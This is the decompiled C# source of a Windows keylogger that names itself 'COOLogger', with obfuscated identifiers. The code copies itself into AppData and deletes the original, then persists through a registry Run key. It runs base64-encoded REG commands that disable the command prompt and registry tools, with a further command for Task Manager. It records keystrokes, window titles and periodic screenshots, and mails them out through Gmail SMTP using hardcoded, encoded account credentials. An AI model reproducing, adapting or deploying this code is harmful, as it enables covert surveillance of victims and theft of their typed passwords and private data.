using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class EvUjcNuwRtyMWrF
{
	private static string seGcbDkCnrSsExQ = "amFjb2JzMTEyMkBnbWFpbC5jb20=";

	private static string NjFeWSduKfTczuY = "eW11YnR5Y3l0NHZl";

	private static string aHagodJSTRWtzHl = "smtp.gmail.com";

	private static int yxOSUMlBsdLNhKP = 587;

	private static string SrHyjRTnQVjtObP;

	private static string CcyxaHYLPoPaUmj;

	private static string GcBsoBRgCpyWRuw;

	private static string dxDLzgopnsQXeIV;

	private static string UkoriIXQzhjFhlz;

	private static string XNsCDBGqjqVihxB;

	private static int JUOgPmWgmiuLahj = 1800000;

	private static string pMYmUlXbCpmgywT = null;

	private static string xBEvUjcNuwRtyMW = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";

	private static string rFseGcbDkCnrSsE = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static string xQNjFeWSduKfTcz = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static object cZIVuuWfrTnSqJi = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string sQLoqXdwFtZVVUZ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage KQYoPOeUXPnRvtb = new MailMessage();

	private static SmtpClient hMvrgBrivGoocOp = new SmtpClient();

	[AccessedThroughProperty("MvrgBrivGoocOpM")]
	private static MYmUlXbCpmgywTo _MvrgBrivGoocOpM;

	private static object mxBQlmvGBetNgzu = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox EhMvrgBrivGoocO = new RichTextBox();

	private static MYmUlXbCpmgywTo MvrgBrivGoocOpM
	{
		get
		{
			return _MvrgBrivGoocOpM;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_MvrgBrivGoocOpM != null)
			{
				MYmUlXbCpmgywTo.KeyDown -= BEvUjcNuwRtyMWr;
			}
			_MvrgBrivGoocOpM = value;
			if (_MvrgBrivGoocOpM != null)
			{
				MYmUlXbCpmgywTo.KeyDown += BEvUjcNuwRtyMWr;
			}
		}
	} = new MYmUlXbCpmgywTo();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02da: Expected O, but got Unknown
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0303: Expected O, but got Unknown
		XNsCDBGqjqVihxB = Conversions.ToString(true);
		GcBsoBRgCpyWRuw = Conversions.ToString(true);
		dxDLzgopnsQXeIV = Conversions.ToString(true);
		UkoriIXQzhjFhlz = Conversions.ToString(false);
		CcyxaHYLPoPaUmj = Conversions.ToString(true);
		SrHyjRTnQVjtObP = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, cZIVuuWfrTnSqJi, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(cZIVuuWfrTnSqJi, (object)"\\nuLllBqtlKnSQxm.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(sQLoqXdwFtZVVUZ + "\\nuLllBqtlKnSQxm.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(cZIVuuWfrTnSqJi, (object)"\\"), mxBQlmvGBetNgzu))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(cZIVuuWfrTnSqJi, (object)"\\"), mxBQlmvGBetNgzu)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(cZIVuuWfrTnSqJi, (object)"\\"), mxBQlmvGBetNgzu)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(cZIVuuWfrTnSqJi, (object)"\\"), mxBQlmvGBetNgzu)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(cZIVuuWfrTnSqJi, (object)"\\"), mxBQlmvGBetNgzu) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(SrHyjRTnQVjtObP))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(mxBQlmvGBetNgzu)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(mxBQlmvGBetNgzu), Operators.ConcatenateObject(Operators.ConcatenateObject(cZIVuuWfrTnSqJi, (object)"\\"), mxBQlmvGBetNgzu));
			}
		}
		if (Conversions.ToBoolean(CcyxaHYLPoPaUmj))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(cZIVuuWfrTnSqJi, (object)"\\nuLllBqtlKnSQxm.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(GcBsoBRgCpyWRuw))
		{
			Interaction.Shell(FseGcbDkCnrSsEx(xBEvUjcNuwRtyMW), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(dxDLzgopnsQXeIV))
		{
			Interaction.Shell(FseGcbDkCnrSsEx(rFseGcbDkCnrSsE), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(UkoriIXQzhjFhlz))
		{
			Interaction.Shell(FseGcbDkCnrSsEx(xQNjFeWSduKfTcz), (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(1800000);
		val.add_Tick((EventHandler)YmUlXbCpmgywToN_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)TPbesPQZjeIXpKd_Ticked);
		val2.Start();
		MvrgBrivGoocOpM.NTPbesPQZjeIXpK();
		Application.Run();
	}

	private static string cxzJgOqHntNVKql()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string FseGcbDkCnrSsEx(string lyxOSUMlBsdLNhK)
	{
		byte[] bytes = Convert.FromBase64String(lyxOSUMlBsdLNhK);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void YmUlXbCpmgywToN_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(XNsCDBGqjqVihxB))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = KdXNsCDBGqjqVih(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(cZIVuuWfrTnSqJi, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(cZIVuuWfrTnSqJi, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(FseGcbDkCnrSsEx(seGcbDkCnrSsExQ));
				mailMessage.To.Add(FseGcbDkCnrSsEx(seGcbDkCnrSsExQ));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = EhMvrgBrivGoocO.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(FseGcbDkCnrSsEx(seGcbDkCnrSsExQ), FseGcbDkCnrSsEx(NjFeWSduKfTczuY));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				EhMvrgBrivGoocO.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage kQYoPOeUXPnRvtb = KQYoPOeUXPnRvtb;
		kQYoPOeUXPnRvtb.From = new MailAddress(FseGcbDkCnrSsEx(seGcbDkCnrSsExQ));
		kQYoPOeUXPnRvtb.To.Add(FseGcbDkCnrSsEx(seGcbDkCnrSsExQ));
		kQYoPOeUXPnRvtb.Subject = "COOLogger Logs from - " + Environment.UserName;
		kQYoPOeUXPnRvtb.Body = EhMvrgBrivGoocO.get_Text();
		kQYoPOeUXPnRvtb = null;
		SmtpClient smtpClient2 = hMvrgBrivGoocOp;
		smtpClient2.Host = "smtp.gmail.com";
		smtpClient2.Port = 587;
		smtpClient2.EnableSsl = true;
		smtpClient2.Credentials = new NetworkCredential(FseGcbDkCnrSsEx(seGcbDkCnrSsExQ), FseGcbDkCnrSsEx(NjFeWSduKfTczuY));
		smtpClient2.Send(KQYoPOeUXPnRvtb);
		smtpClient2 = null;
		EhMvrgBrivGoocO.set_Text("");
	}

	public static void BEvUjcNuwRtyMWr(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox ehMvrgBrivGoocO = EhMvrgBrivGoocO;
		ehMvrgBrivGoocO.set_Text(ehMvrgBrivGoocO.get_Text() + MvrgBrivGoocOpM.dXNsCDBGqjqVihx(e));
	}

	public static void TPbesPQZjeIXpKd_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(pMYmUlXbCpmgywT, cxzJgOqHntNVKql(), false) != 0)
		{
			pMYmUlXbCpmgywT = cxzJgOqHntNVKql();
			if (Operators.CompareString(pMYmUlXbCpmgywT, "", false) != 0)
			{
				RichTextBox ehMvrgBrivGoocO = EhMvrgBrivGoocO;
				ehMvrgBrivGoocO.set_Text(ehMvrgBrivGoocO.get_Text() + "\r\n\r\n~~~~~" + pMYmUlXbCpmgywT + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string KdXNsCDBGqjqVih(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
